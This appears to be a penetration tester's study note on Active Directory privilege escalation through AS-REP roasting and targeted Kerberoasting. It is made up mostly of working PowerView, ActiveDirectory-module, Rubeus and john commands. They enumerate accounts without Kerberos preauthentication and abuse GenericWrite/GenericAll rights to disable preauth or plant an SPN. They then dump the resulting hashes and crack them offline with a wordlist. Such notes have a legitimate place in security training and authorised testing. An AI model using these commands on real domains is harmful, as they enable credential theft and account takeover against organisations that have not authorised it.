---
tags:
  - privesc
cssclasses: []
---
If a user's UAC setting has "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute force it offline. With sufficient rights (`GenericWrite` or `GenericAll`), Kerberos preauth can be forced disabled as well.

#### Enumerating accounts with preauth disabled

```powershell title:"Using Powerview"
Get-DomainUser -PreauthNotRequired -Verbose
```

```powershell title:"Using ActiveDirectory module"
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
#### Force disable Kerberos Preauth

```powershell title:"Enumerate the permissions for a group on ACLs and set the UAC to DoesNotRequirePreAuth"
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "groupname"}
Set-DomainObject -Identity userofthatgroup -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Verbose
```

```powershell title:"Request encrypted AS-REP for offline brute-force"
Get-ASREPHash -UserName username -Verbose
```

```powershell title:"Enumerate all users with Kerberos preauth disabled and request a hash"
Invoke-ASREPRoast -Verbose
```

```batch title:"Crack the AS-REP to obtain the user's password using john"
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```

#### Leveraging permissions to change a user's SPN

- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in domain).
- We can then request a TGS without special privileges. The TGS can then be [Kerberoasted](Kerberoasting).

```powershell title:"Enumerate the permissions for a group on ACLs using PowerView"
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "groupname"}
```

```powershell title:"Check if the user already has a SPN (PowerView)"
Get-DomainUser -Identity userofthatgroup | select serviceprinciplename
```

```powershell title:"Check if the user already has a SPN (Active Directory Module)"
Get-ADUser -Identity userofthatgroup -Properties ServicePrincipleName | select ServicePrincipleName
```

```powershell title:"Set a SPN for the user (must be unique for the domain) (Using PowerView)"
Set-DomainObject -Identity userofthatgroup -Set @{serviceprincipalname='service/serviceprovider'}
```

```powershell title:"Set a SPN for the user (must be unique for the domain) (Using ActiveDirectory Module)"
Set-ADuser -Identity userofthatgroup -ServicePrincipleNames @{Add='service/serviceprovider'}
```

```batch title:"Kerberoast that user"
Rubeus.exe kerberoast /outfile:targetedhashes.txt
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```


